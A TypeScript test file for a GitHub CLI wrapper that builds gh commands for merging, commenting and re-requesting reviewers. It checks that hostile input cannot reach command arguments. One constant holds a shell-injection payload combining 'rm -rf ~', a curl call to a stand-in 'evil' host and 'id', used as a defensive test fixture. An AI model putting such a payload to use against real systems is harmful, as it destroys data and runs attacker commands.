// The direct GitHub actions against a fake `gh`: nothing here reaches GitHub.
// Inkwell fixtures only.
import { describe, expect, it } from "vitest";
import {
  commentArgv,
  mergeArgv,
  parseReviewRequests,
  prTarget,
  readLiveMerge,
  readReviewThreads,
  rerequestArgv,
  runMerge,
  runNudge,
  runUpdateBranch,
  threadsArgv,
  type GhRunner,
  type Run,
} from "./ghactions.js";
import { parsePrList } from "./gh.js";

const SHA = "0123456789abcdef0123456789abcdef01234567";
const TARGET = prTarget("https://github.com/inkwell/folio/pull/47")!;
/** A hostile title, body and branch: none of it may ever reach an argv flag or a shell. */
const HOSTILE = `"; rm -rf ~ #$(curl evil) \`id\``;

function fakeGh(answers: (args: readonly string[]) => Run = () => ({ ok: true, stdout: "" })) {
  const calls: { args: readonly string[]; stdin: string | undefined }[] = [];
  const run: GhRunner = async (args, stdin) => {
    calls.push({ args, stdin });
    return answers(args);
  };
  return { run, calls };
}

describe("prTarget", () => {
  it("reads owner, repo and number from a PR URL, and names github.com repos as OWNER/REPO", () => {
    expect(TARGET).toEqual({ host: "github.com", owner: "inkwell", name: "folio", slug: "inkwell/folio", number: 47 });
    expect(prTarget("https://git.inkwell.example/inkwell/spine/pull/88")?.slug).toBe("git.inkwell.example/inkwell/spine");
  });

  it("refuses anything that is not a plain PR URL, so a crafted URL cannot become a gh argument", () => {
    for (const url of ["", "https://github.com/inkwell/folio/issues/47", "https://github.com/-x/folio/pull/47", "https://github.com/inkwell/../pull/47", `https://github.com/inkwell/folio/pull/47${HOSTILE}`]) {
      expect(prTarget(url)).toBeNull();
    }
  });
});

describe("argv construction", () => {
  it("always pins the merge to the confirmed head commit, and names the repo so gh leaves the local checkout alone", () => {
    expect(mergeArgv(TARGET, "squash", SHA, false)).toEqual(["pr", "merge", "47", "--repo", "inkwell/folio", "--squash", "--match-head-commit", SHA]);
    expect(mergeArgv(TARGET, "rebase", SHA, true)).toEqual(["pr", "merge", "47", "--repo", "inkwell/folio", "--rebase", "--match-head-commit", SHA, "--delete-branch"]);
  });

  it("refuses to build a merge without a full head sha, so --match-head-commit can never be skipped", () => {
    expect(() => mergeArgv(TARGET, "squash", "", false)).toThrow();
    expect(() => mergeArgv(TARGET, "squash", "abc123", false)).toThrow();
    expect(() => mergeArgv(TARGET, "squash", `${SHA} --admin`, false)).toThrow();
  });

  it("keeps the comment body out of argv entirely", () => {
    expect(commentArgv(TARGET)).toEqual(["pr", "comment", "47", "--repo", "inkwell/folio", "--body-file", "-"]);
  });

  it("drops anything that is not a login or team slug from --add-reviewer", () => {
    expect(rerequestArgv(TARGET, ["ada-inkwell", "--admin", HOSTILE, "inkwell/shelf-team"])).toEqual([
      "pr", "edit", "47", "--repo", "inkwell/folio", "--add-reviewer", "ada-inkwell,inkwell/shelf-team",
    ]);
    expect(() => rerequestArgv(TARGET, ["--admin"])).toThrow();
  });

  it("passes graphql variables as typed fields, with the query a constant", () => {
    const args = threadsArgv(TARGET);
    expect(args).toContain("owner=inkwell");
    expect(args).toContain("name=folio");
    expect(args).toContain("number=47");
    expect(args.some((arg) => arg.startsWith("query=") && arg.includes("$owner"))).toBe(true);
  });
});

describe("parseReviewRequests", () => {
  it("reads users by login and teams by org/slug, and drops anything else", () => {
    expect(
      parseReviewRequests([
        { __typename: "User", login: "ada-inkwell" },
        { __typename: "Team", slug: "shelf-team", organization: { login: "inkwell" } },
        { __typename: "Team", slug: "inkwell/margin-team" },
        { __typename: "User", login: "-flag" },
        null,
        "nonsense",
      ]),
    ).toEqual(["ada-inkwell", "inkwell/shelf-team", "inkwell/margin-team"]);
    expect(parseReviewRequests(undefined)).toEqual([]);
  });

  it("rides along on the existing gh pr list call, defaulting to none", () => {
    const row = (extra: object) => JSON.stringify([{ number: 61, state: "OPEN", ...extra }]);
    expect(parsePrList(row({ reviewRequests: [{ __typename: "User", login: "ada-inkwell" }] }))?.pr.reviewRequests).toEqual(["ada-inkwell"]);
    expect(parsePrList(row({}))?.pr.reviewRequests).toEqual([]);
  });
});

describe("readLiveMerge", () => {
  const view = { state: "OPEN", isDraft: false, reviewDecision: "APPROVED", mergeStateStatus: "CLEAN", headRefOid: SHA, headRefName: "dev/abc-101" };
  const threads = (nodes: { isResolved: boolean }[], hasNextPage = false) =>
    JSON.stringify({ data: { repository: { pullRequest: { reviewThreads: { pageInfo: { hasNextPage }, nodes } } } } });
  const answers = (stacked: object[], nodes: { isResolved: boolean }[], more = false) => (args: readonly string[]): Run => {
    if (args[1] === "view") return { ok: true, stdout: JSON.stringify(view) };
    if (args[1] === "list") return { ok: true, stdout: JSON.stringify(stacked) };
    return { ok: true, stdout: threads(nodes, more) };
  };

  it("reads state, head, open PRs stacked on the head branch, and unresolved threads — all read-only", async () => {
    const { run, calls } = fakeGh(answers([{ number: 58 }], [{ isResolved: false }, { isResolved: true }, { isResolved: false }]));
    const result = await readLiveMerge(run, TARGET);
    expect(result).toEqual({
      ok: true,
      live: {
        state: "OPEN",
        isDraft: false,
        reviewDecision: "APPROVED",
        mergeStateStatus: "CLEAN",
        headRefOid: SHA,
        stackedAbove: [58],
        unresolvedThreads: 2,
        unresolvedAtLeast: false,
      },
    });
    expect(calls.find((call) => call.args[1] === "list")?.args).toEqual([
      "pr", "list", "--repo", "inkwell/folio", "--base", "dev/abc-101", "--state", "open", "--json", "number", "--limit", "50",
    ]);
    for (const call of calls) expect(["view", "list", "graphql"]).toContain(call.args[1]);
  });

  it("marks the unresolved count as a lower bound past one page", async () => {
    const { run } = fakeGh(answers([], [{ isResolved: false }], true));
    const result = await readLiveMerge(run, TARGET);
    expect(result.ok && result.live.unresolvedAtLeast).toBe(true);
  });

  it("fails loudly rather than reporting zero when the thread count cannot be read", async () => {
    const { run } = fakeGh((args) => (args[0] === "api" ? { ok: false, error: "HTTP 502" } : answers([], [])(args)));
    expect(await readLiveMerge(run, TARGET)).toEqual({ ok: false, error: "Could not count unresolved review threads: HTTP 502" });
  });
});

describe("readReviewThreads", () => {
  it("refuses an empty first page when later review thread pages are unread, so neither the Board nor merge dialog claims the PR is clear", async () => {
    const paginated = fakeGh(() => ({ ok: true, stdout: JSON.stringify({ data: { repository: { pullRequest: { reviewThreads: { pageInfo: { hasNextPage: true }, nodes: [{ isResolved: true }] } } } } }) }));
    expect((await readReviewThreads(paginated.run, TARGET)).ok).toBe(false);
    expect((await readLiveMerge(paginated.run, TARGET)).ok).toBe(false);
  });

  it("does not turn partial GraphQL data or unreadable nodes into a clear review state", async () => {
    const partial = fakeGh(() => ({ ok: true, stdout: JSON.stringify({ errors: [{ message: "partial" }], data: { repository: { pullRequest: { reviewThreads: { pageInfo: { hasNextPage: false }, nodes: [] } } } } }) }));
    expect((await readReviewThreads(partial.run, TARGET)).ok).toBe(false);
    const malformed = fakeGh(() => ({ ok: true, stdout: JSON.stringify({ data: { repository: { pullRequest: { reviewThreads: { pageInfo: { hasNextPage: false }, nodes: [{}] } } } } }) }));
    expect((await readReviewThreads(malformed.run, TARGET)).ok).toBe(false);
  });
});

describe("writes", () => {
  it("merges once, with the confirmed sha, and reports GitHub's refusal when the head moved", async () => {
    const ok = fakeGh();
    expect((await runMerge(ok.run, TARGET, "squash", SHA, false)).ok).toBe(true);
    expect(ok.calls).toHaveLength(1);
    expect(ok.calls[0]!.args).toContain("--match-head-commit");
    const moved = fakeGh(() => ({ ok: false, error: "Head branch was modified" }));
    expect(await runMerge(moved.run, TARGET, "squash", SHA, false)).toEqual({
      ok: false,
      error: "GitHub refused the merge: Head branch was modified",
    });
  });

  it("updates the branch with one gh pr update-branch call", async () => {
    const { run, calls } = fakeGh();
    expect((await runUpdateBranch(run, TARGET)).ok).toBe(true);
    expect(calls.map((call) => call.args)).toEqual([["pr", "update-branch", "47", "--repo", "inkwell/folio"]]);
  });

  it("nudges with pending reviewers: re-requests, then posts the body on stdin only", async () => {
    const { run, calls } = fakeGh();
    const body = `PTAL - @ada-inkwell: folio #47 (${HOSTILE}) has been waiting 3d.`;
    expect((await runNudge(run, TARGET, ["ada-inkwell"], body)).ok).toBe(true);
    expect(calls[0]!.args).toEqual(["pr", "edit", "47", "--repo", "inkwell/folio", "--add-reviewer", "ada-inkwell"]);
    expect(calls[1]).toEqual({ args: ["pr", "comment", "47", "--repo", "inkwell/folio", "--body-file", "-"], stdin: body });
    for (const call of calls) expect(call.args.join(" ")).not.toContain(HOSTILE);
  });

  it("nudges with no pending reviewers: comment only, no re-request call", async () => {
    const { run, calls } = fakeGh();
    expect((await runNudge(run, TARGET, [], "PTAL - folio #47 (Show gift card balance) has been waiting 3d.")).ok).toBe(true);
    expect(calls.map((call) => call.args[1])).toEqual(["comment"]);
  });

  it("does nothing, and says so, when neither part was chosen", async () => {
    const { run, calls } = fakeGh();
    expect((await runNudge(run, TARGET, [], null)).ok).toBe(false);
    expect(calls).toEqual([]);
  });
});
